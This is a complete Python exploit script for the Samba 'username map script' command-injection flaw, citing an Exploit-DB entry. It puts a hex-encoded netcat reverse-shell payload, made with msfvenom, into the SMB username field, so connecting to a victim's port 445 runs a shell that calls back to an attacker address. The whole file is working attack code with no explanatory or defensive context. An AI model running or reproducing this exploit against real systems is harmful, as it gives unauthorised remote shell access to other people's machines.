#!/usr/bin/python3

from smb.SMBConnection import SMBConnection
import random, string
from smb import smb_structs
smb_structs.SUPPORT_SMB2 = False
import sys 

if len(sys.argv) < 2:
    print ("\nUso: python3 " + sys.argv[0] + " <IP-Victima>\n")
    sys.exit()

# Shellcode:
# msfvenom -p cmd/unix/reverse_netcat LHOST=IP-LOCAL LPORT=445 -f python

buf =  ""
buf += "\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x63"
buf += "\x69\x61\x77\x78\x3b\x20\x6e\x63\x20\x31\x30\x2e\x31"
buf += "\x30\x2e\x31\x34\x2e\x35\x36\x20\x35\x35\x35\x35\x20"
buf += "\x30\x3c\x2f\x74\x6d\x70\x2f\x63\x69\x61\x77\x78\x20"
buf += "\x7c\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x3e\x2f\x74"
buf += "\x6d\x70\x2f\x63\x69\x61\x77\x78\x20\x32\x3e\x26\x31"
buf += "\x3b\x20\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x63\x69\x61"
buf += "\x77\x78"


username = "/=` nohup " + buf + "`"
password = ""
con = SMBConnection(username, password, "HACK" , "F", use_ntlm_v2 = False)
assert con.connect(sys.argv[1], 445)

# smb-usermap.py <RHOSTS>
# Reference - https://www.exploit-db.com/exploits/16320/
